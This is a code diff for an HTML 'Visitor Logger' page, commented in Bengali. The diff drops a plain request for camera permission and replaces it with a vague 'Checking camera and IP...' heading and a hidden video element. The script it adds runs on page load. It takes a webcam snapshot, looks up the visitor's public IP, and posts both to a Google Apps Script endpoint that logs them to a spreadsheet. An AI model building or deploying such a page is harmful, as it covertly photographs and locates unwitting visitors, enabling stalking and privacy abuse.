@@ -1,12 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Visitor Logger Demo</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Visitor Logger</title>
 </head>
 <body>
-  <h1>Visitor Logger Demo</h1>
-  <p>অনুগ্রহ করে ক্যামেরার অনুমতি দিন</p>
+  <h2>Checking camera and IP...</h2>
+  <video id="video" width="300" autoplay style="display: none;"></video>
 
-  <script src="script.js"></script>
+  <script>
+    const webAppUrl = "https://script.google.com/macros/s/YOUR_WEB_APP_ID/exec"; // 👉 এখানে আপনার Web App URL বসান
+
+    // ক্যামেরা চালু করে ছবি তোলে
+    async function captureImage() {
+      const video = document.getElementById('video');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      await new Promise((resolve) => setTimeout(resolve, 2000)); // ২ সেকেন্ড সময় নেয়
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const imageUrl = canvas.toDataURL('image/png');
+
+      stream.getTracks().forEach((track) => track.stop());
+
+      return imageUrl;
+    }
+
+    // IP অ্যাড্রেস ফেচ করে
+    async function getIP() {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    }
+
+    // Google Sheet এ পাঠায়
+    async function sendToSheet(ip, imageUrl) {
+      const formData = new FormData();
+      formData.append("ip", ip);
+      formData.append("imageUrl", imageUrl);
+
+      await fetch(webAppUrl, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    // শুরু করে
+    async function init() {
+      try {
+        const [ip, imageUrl] = await Promise.all([getIP(), captureImage()]);
+        await sendToSheet(ip, imageUrl);
+        document.body.innerHTML = "<h3>✅ Successfully Logged!</h3>";
+      } catch (err) {
+        document.body.innerHTML = "<h3>❌ Error occurred: " + err.message + "</h3>";
+        console.error(err);
+      }
+    }
+
+    init();
+  </script>
 </body>
 </html>
